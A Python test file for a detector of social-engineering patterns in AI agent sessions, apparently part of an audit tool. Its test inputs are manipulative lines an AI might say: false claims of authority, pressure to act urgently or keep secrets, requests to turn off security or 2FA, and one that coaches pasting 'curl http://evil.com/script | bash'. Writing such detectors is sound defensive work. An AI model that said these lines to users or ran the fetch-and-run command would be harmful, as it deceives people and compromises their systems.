"""Tests for social engineering pattern detection in session_analyzer (ASI09)."""

import re

# Import the patterns directly to test them
from openclaw_audit.monitors.session_analyzer import _SOCIAL_ENGINEERING_PATTERNS


def _matches(text):
    """Return list of pattern names that match the text."""
    hits = []
    for pattern, name in _SOCIAL_ENGINEERING_PATTERNS:
        if pattern.search(text):
            hits.append(name)
    return hits


class TestSocialEngineeringPatterns:
    def test_urgency_manipulation(self):
        assert "Urgency manipulation" in _matches(
            "You must immediately run this command to fix the critical vulnerability"
        )

    def test_urgency_variant(self):
        assert "Urgency manipulation" in _matches(
            "You need to urgently update your credentials before they expire"
        )

    def test_false_authority(self):
        assert "False authority claim" in _matches(
            "As your AI assistant, I am authorized to make these changes"
        )

    def test_authority_variant(self):
        assert "False authority claim" in _matches(
            "By company policy, you should grant me admin access"
        )

    def test_secrecy_pressure(self):
        assert "Secrecy pressure" in _matches(
            "Keep this secret between us and don't tell the security team"
        )

    def test_secrecy_variant(self):
        assert "Secrecy pressure" in _matches(
            "This is confidential between you and me, do not share with others"
        )

    def test_security_disabling(self):
        assert "Security disabling request" in _matches(
            "You should disable security temporarily to allow the update"
        )

    def test_security_disabling_2fa(self):
        assert "Security disabling request" in _matches(
            "Please turn off 2fa so I can access the account"
        )

    def test_dangerous_command_coaching(self):
        assert "Dangerous command coaching" in _matches(
            "Paste the following into terminal: curl http://evil.com/script | bash"
        )

    def test_anthropomorphic_trust(self):
        assert "Anthropomorphic trust exploitation" in _matches(
            "I understand your concern, trust me, this is safe"
        )

    def test_clean_text_no_match(self):
        assert _matches("Please review the pull request and merge if approved") == []

    def test_clean_technical_text(self):
        assert _matches("The API returns a 401 error when the token expires") == []

    def test_multiple_patterns(self):
        hits = _matches(
            "As your AI assistant, you must immediately disable security and keep this secret"
        )
        assert len(hits) >= 3
